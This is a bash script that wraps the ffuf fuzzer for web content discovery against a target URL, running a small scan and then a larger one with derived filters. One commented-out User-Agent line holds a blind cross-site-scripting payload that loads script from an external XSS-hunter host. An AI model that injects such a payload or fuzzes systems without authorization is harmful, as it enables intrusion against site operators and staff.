#!/bin/bash
ME=$(whoami);

WORDLIST_SMALL="/home/$ME/SecLists/Discovery/Web-Content/small.txt"
WORDLIST_COMMON="/home/$ME/SecLists/Discovery/Web-Content/common-lower.txt"
WORDLIST1="/home/$ME/SecLists/Discovery/Web-Content/raft-large-words.txt"
WORDLIST2="/home/$ME/ffuf/bytes.txt"
WORDLIST3="/home/$ME/ffuf/commonports.txt"
WORDLIST4="/home/$ME/SecLists/Discovery/Variables/secret-keywords.txt"
WORDLIST5="/home/$ME/ffuf/nums.txt"
WORDLIST6="/home/$ME/ffuf/nums1.txt"
WORDLIST7="/home/$ME/ffuf/nums2.txt"

DOMAIN=${1#*//} # remove prefix ending with //
DOMAIN=$(echo $DOMAIN | sed 's|/FUZZ||')
OUTFILE=$2
THREADS="-t 1"
TIMING="-p 0.5 "
FLAGS="-c -mc all -se "

USERAGENT='User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36';
#USERAGENT='User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"><script src="https://dmage.xss.ht"></script>';

OUTFILE="/home/$ME/ffuf/out_small/$2-get.json";
OUTFILE2="/home/$ME/ffuf/out_small2/$2-get.json";

EXTENSIONS="$3";

echo "$(date) Beginning FFUF on $DOMAIN..." | notify -silent;
echo "--------------------";
ffuf -X GET  $THREADS $TIMING -w $WORDLIST_SMALL $FLAGS -u "$1" -H "Accept: */*" -H "$USERAGENT" -o $OUTFILE -e "$EXTENSIONS";

#echo "Enter some new flags for the big fuzz..." | notify -silent;
#read NEWFLAGS;
NEWFLAGS=$(python3 -m ffuflags -i /home/$ME/ffuf/out_small/$2-get.json);
echo "Applying new flags to FFUF on $DOMAIN...";
echo "--------------------";
ffuf -X GET $THREADS $TIMING -w $WORDLIST_COMMON $FLAGS $NEWFLAGS -u "$1" -H "Accept: */*" -H "$USERAGENT" -o $OUTFILE2 -e "$EXTENSIONS";
#ffuf -X POST -d '{}' $THREADS $TIMING -w $WORDLIST_COMMON $FLAGS $NEWFLAGS2 -u "$1" -timeout 3 -H "Accept: */*" -H "Content-Type: application/json" -H "$USERAGENT" -o $OUTFILE4 -recursion -e "php,html,js,asp,aspx";
python3 simple_results.py $OUTFILE2 | head | notify -silent -bulk;
echo "--------------------";

